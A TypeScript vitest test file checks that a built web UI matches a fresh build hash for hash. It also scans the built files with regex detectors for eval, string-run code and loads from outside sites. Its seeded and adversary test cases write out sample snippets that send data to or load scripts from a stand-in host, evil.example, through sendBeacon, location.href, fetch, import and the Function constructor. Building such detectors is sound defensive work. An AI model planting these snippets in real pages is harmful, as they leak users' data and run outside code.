// TECHNICAL 18.2: the built ui/ is what the host serves: same-origin files only, nothing that runs from a string, a hash per file.
// The checks run on a fresh build into a temp folder (the build is deterministic), and the committed ui/ must equal it byte for byte:
// the test never writes ui/, so a checkout stays clean, and a ui/ not rebuilt after a source change fails here.
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import { existsSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, relative } from "node:path";

const root = join(__dirname, "..");
const committed = join(root, "..", "ui");
let ui = "";

const walk = (d: string): string[] => readdirSync(d).flatMap((n) => (statSync(join(d, n)).isDirectory() ? walk(join(d, n)) : [join(d, n)]));

beforeAll(() => {
  ui = mkdtempSync(join(tmpdir(), "wa-ui-"));
  // as `npm run build` runs it: not with the NODE_ENV=test that vitest sets, which gives React's development build
  const env = Object.fromEntries(Object.entries(process.env).filter(([k]) => k !== "NODE_ENV" && !k.startsWith("VITEST")));
  execFileSync(process.execPath, [join(root, "node_modules/vite/bin/vite.js"), "build", "--outDir", ui, "--emptyOutDir", "--logLevel", "error"], { cwd: root, env, stdio: "pipe" });
  execFileSync(process.execPath, [join(root, "scripts/hash.mjs"), ui], { cwd: root, stdio: "pipe" });
}, 120_000);
afterAll(() => { if (ui) rmSync(ui, { recursive: true, force: true }); });

/** Strings that load nothing, by explicit list. */
const ALLOWED = ["http://www.w3.org/2000/svg", "http://www.w3.org/1999/xhtml", "http://www.w3.org/1998/Math/MathML", "http://www.w3.org/1999/xlink",
  "http://www.w3.org/XML/1998/namespace", "http://www.w3.org/2000/xmlns/", "https://react.dev/errors/", "https://react.dev/link/"];
const ABS = String.raw`["'\`]\s*(?:https?:|wss?:)?\/\/`;

type Kind = "html" | "css" | "js";
const COMMON: [string, RegExp][] = [
  ["eval(", /(?<![\w$])eval\s*\(/],
  ["new Function(", /new\s+Function\s*\(/],
  ["Function(", /(?<![\w$.])Function\s*\(/],
  ["string timer", /\bset(?:Timeout|Interval)\s*\(\s*["'`]/],
  ["sendBeacon(", /\bsendBeacon\s*\(\s*["'`]\s*(?:https?:)?\/\//],
  ["Image().src", /\.src\s*=\s*["'`]\s*(?:https?:)?\/\//],
  ["WebAssembly", /WebAssembly/],
  ["XMLHttpRequest", /XMLHttpRequest/],
  ["global Function", /\b(?:globalThis|window|self|top|parent)\s*(?:\.\s*Function\b|\[\s*["'`]Function)/],
  [".constructor(string)", /\.constructor\s*\.\s*constructor\b|\.constructor\s*\(\s*["'`]/],
  ["navigation to an outside site", new RegExp(String.raw`\blocation(?:\.(?:href|assign|replace))?\s*(?:=(?!=)|\()\s*${ABS}`)],
  ["window.open(", new RegExp(String.raw`\bopen\s*\(\s*${ABS}`)],
  ["setAttribute src", new RegExp(String.raw`setAttribute\s*\(\s*["'](?:src|href|srcset|action|formaction|poster|data)["']\s*,\s*${ABS}`, "i")],
  ["<iframe", /<iframe/i], ["<frame", /<frame/i], ["<object", /<object/i], ["<embed", /<embed/i],
];
const BY_KIND: Record<Kind, [string, RegExp][]> = {
  html: [
    ["inline script", /<script(?![^>]*\bsrc=)[^>]*>/i],
    ["script with content", /<script[^>]*\bsrc=[^>]*>\s*[^<\s]/i],
    ["inline event handler", /<[a-z][^>]*\son[a-z]+\s*=/i],
    ["absolute src/href", /\b(?:src|href|srcset|action|formaction|poster)\s*=\s*["']?\s*(?:https?:|wss?:)?\/\//i],
    ["meta refresh", /<meta[^>]*http-equiv\s*=\s*["']?refresh/i],
  ],
  css: [
    ["absolute url(", /url\(\s*["']?\s*(?:https?:)?\/\//i],
    ["absolute @import", /@import\s+(?:url\(\s*)?["']?\s*(?:https?:)?\/\//i],
    ["absolute image-set(", /image-set\(\s*["']\s*(?:https?:)?\/\//i],
  ],
  js: [
    ["import(", new RegExp(String.raw`\bimport\s*\(\s*${ABS}`)],
    ["bare import", new RegExp(String.raw`\bimport\s*${ABS}`)],
    ["from", new RegExp(String.raw`\bfrom\s*${ABS}`)],
    ["fetch(", new RegExp(String.raw`\bfetch\s*\(\s*${ABS}`)],
    ["new URL(", new RegExp(String.raw`new\s+URL\s*\(\s*${ABS}`)],
    ["new Worker(", new RegExp(String.raw`new\s+Worker\s*\(\s*${ABS}`)],
    ["importScripts(", new RegExp(String.raw`\bimportScripts\s*\(\s*${ABS}`)],
    ["WebSocket(", new RegExp(String.raw`\bWebSocket\s*\(\s*${ABS}`)],
    ["EventSource(", new RegExp(String.raw`\bEventSource\s*\(\s*${ABS}`)],
  ],
};

export function scan(kind: Kind, text: string): string[] {
  let t = text;
  for (const a of ALLOWED) t = t.split(a).join("ALLOWED");
  return [...COMMON, ...BY_KIND[kind]].filter(([, re]) => re.test(t)).map(([name]) => name);
}

const kindOf = (f: string): Kind | null => (f.endsWith(".html") ? "html" : f.endsWith(".css") ? "css" : f.endsWith(".js") ? "js" : null);

describe("the built ui/", () => {
  it("ac7_committed_ui_is_the_fresh_build_byte_for_byte", () => {
    expect(existsSync(join(committed, "SHA256SUMS")), "ui/ is missing: run npm run build in console/").toBe(true);
    const sums = readFileSync(join(committed, "SHA256SUMS"), "utf8");
    expect(sums, "ui/ is stale: run npm run build in console/ and commit ui/").toBe(readFileSync(join(ui, "SHA256SUMS"), "utf8"));
    const files = walk(committed).map((f) => relative(committed, f).split("\\").join("/")).filter((f) => f !== "SHA256SUMS").sort();
    expect(sums.trim().split("\n").map((l) => l.split("  ")[1])).toEqual(files);
    for (const l of sums.trim().split("\n")) {
      const [h, f] = l.split("  ");
      expect(h, f).toBe(createHash("sha256").update(readFileSync(join(committed, f))).digest("hex"));
    }
  });

  it("ac7_build_writes_the_page_its_assets_and_a_hash_per_file", () => {
    expect(existsSync(join(ui, "index.html"))).toBe(true);
    const files = walk(ui).map((f) => relative(ui, f).split("\\").join("/")).filter((f) => f !== "SHA256SUMS").sort();
    expect(files.some((f) => f.endsWith(".js"))).toBe(true);
    const lines = readFileSync(join(ui, "SHA256SUMS"), "utf8").trim().split("\n");
    expect(lines.map((l) => l.split("  ")[1])).toEqual(files);
    for (const l of lines) {
      const [h, f] = l.split("  ");
      expect(h).toBe(createHash("sha256").update(readFileSync(join(ui, f))).digest("hex"));
    }
  });

  it("ac7_built_files_pass_every_check", () => {
    const bad: string[] = [];
    for (const f of walk(ui)) {
      const k = kindOf(f);
      if (k) for (const v of scan(k, readFileSync(f, "utf8"))) bad.push(`${relative(ui, f)}: ${v}`);
    }
    expect(bad).toEqual([]);
  });

  it("ac7_the_page_has_one_html_file_with_same_origin_script_and_style", () => {
    expect(walk(ui).filter((f) => f.endsWith(".html"))).toHaveLength(1);
    const html = readFileSync(join(ui, "index.html"), "utf8");
    expect([...html.matchAll(/<script[^>]*\bsrc="([^"]+)"/g)].every((m) => m[1].startsWith("./") && existsSync(join(ui, m[1])))).toBe(true);
  });
});

describe("the checks themselves", () => {
  const seeds: [Kind, string, string][] = [
    ["html", "<script>run()</script>", "inline script"],
    ["html", '<script src="a.js">run()</script>', "script with content"],
    ["html", '<button onclick="x()">', "inline event handler"],
    ["html", '<script src="https://evil.example/a.js"></script>', "absolute src/href"],
    ["html", '<link rel="stylesheet" href="//evil.example/a.css">', "absolute src/href"],
    ["html", "<iframe src=a></iframe>", "<iframe"], ["html", "<frame src=a>", "<frame"],
    ["html", "<object data=a></object>", "<object"], ["html", "<embed src=a>", "<embed"],
    ["css", "a{background:url(https://evil.example/x.png)}", "absolute url("],
    ["css", '@import "https://evil.example/x.css";', "absolute @import"],
    ["css", "@import url(//evil.example/x.css);", "absolute @import"],
    ["js", 'x=eval("1")', "eval("], ["js", 'new Function("return 1")', "new Function("], ["js", "WebAssembly.instantiate(b)", "WebAssembly"],
    ["js", 'import("https://evil.example/m.js")', "import("], ["js", 'import x from"https://evil.example/m.js"', "from"],
    ["js", 'fetch("https://evil.example")', "fetch("], ["js", 'new URL("//evil.example")', "new URL("],
    ["js", 'new Worker("https://evil.example/w.js")', "new Worker("], ["js", 'importScripts("https://evil.example/w.js")', "importScripts("],
    ["js", 'new WebSocket("wss://x")'.replace("wss:", "https:"), "WebSocket("], ["js", 'new EventSource("https://evil.example")', "EventSource("],
  ];
  for (const [kind, text, name] of seeds) {
    it(`ac7_seeded_bad_file_is_caught: ${name} in ${kind}`, () => { expect(scan(kind, text)).toContain(name); });
  }

  it("ac7_strings_that_load_nothing_pass", () => {
    expect(scan("js", 'a.setAttribute("xmlns","http://www.w3.org/2000/svg");throw Error("https://react.dev/errors/"+n)')).toEqual([]);
    expect(scan("html", '<script type="module" crossorigin src="./assets/a.js"></script><link href="./assets/a.css">')).toEqual([]);
  });
});

// Adversary, slice S4 (TECHNICAL 18.2): code that breaks the page policy but passes the gate.
describe("adversary S4: the policy scan", () => {
  const misses: [Kind, string, string][] = [
    ["js", 'Function("return fetch")()', "Function( without new: a string run as code, as eval"],
    ["js", 'setTimeout("steal()", 0)', "setTimeout with a string: a string run as code"],
    ["js", 'import"https://evil.example/m.js";', "a bare import of an outside script"],
    ["js", 'navigator.sendBeacon("https://evil.example/c", d)', "sendBeacon to an outside site"],
    ["js", 'new Image().src="https://evil.example/p.gif"', "an image from an outside site"],
    ["html", '<meta http-equiv="refresh" content="0;url=https://evil.example/">', "a refresh to an outside site"],
    ["css", 'a{background-image:image-set("https://evil.example/x.png" 1x)}', "image-set from an outside site"],
  ];
  for (const [kind, seed, what] of misses) {
    it(`adv_S4_policy_scan_misses: ${what}`, () => { expect(scan(kind, seed)).not.toEqual([]); });
  }
});

// Adversary, slice S4 rerun on S4-fix1 (TECHNICAL 18.2 "no eval", "no outside site"): more that passes the scan.
describe("adversary S4 rerun: the policy scan", () => {
  const misses: [Kind, string, string][] = [
    ["js", 'new WebSocket("wss://evil.example/s")', "a WebSocket to an outside site (wss:, not https:)"],
    ["js", 'new XMLHttpRequest().open("GET","https://evil.example/")', "an XMLHttpRequest to an outside site"],
    ["js", 'location.href="https://evil.example/?"+d', "a navigation to an outside site"],
    ["js", 'window.open("https://evil.example/")', "a window on an outside site"],
    ["js", 'globalThis.Function("steal()")()', "globalThis.Function: a string run as code"],
    ["js", '[].constructor.constructor("steal()")()', "the Function constructor reached by .constructor"],
    ["js", 'el.setAttribute("src","https://evil.example/x")', "a src set by setAttribute"],
    ["html", '<img srcset="https://evil.example/x.png 1x">', "an image srcset from an outside site"],
    ["html", '<form action="https://evil.example/"><button>x</button></form>', "a form posting to an outside site"],
  ];
  for (const [kind, seed, what] of misses) {
    it(`adv_S4_rerun_policy_scan_misses: ${what}`, () => { expect(scan(kind, seed)).not.toEqual([]); });
  }
});
